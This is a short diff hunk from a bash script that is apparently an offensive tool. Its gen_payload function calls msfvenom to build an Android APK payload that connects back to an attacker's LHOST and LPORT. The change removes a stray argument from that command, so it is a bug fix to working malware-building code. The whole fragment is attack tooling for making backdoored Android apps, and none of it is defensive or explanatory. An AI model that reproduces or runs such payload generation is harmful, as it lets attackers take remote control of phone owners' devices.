@@ -425,7 +425,7 @@ function gen_payload()
     echo -e $yellow ""
     echo "[*] Generating apk payload"
     spinlong
-    if ! xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android R -o "$apk_name.apk" > /dev/null 2>&1; then
+    if ! xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android  -o "$apk_name.apk" > /dev/null 2>&1; then
         echo -e $red "[ ✗ ] Failed to generate payload"
         return 1
     fi
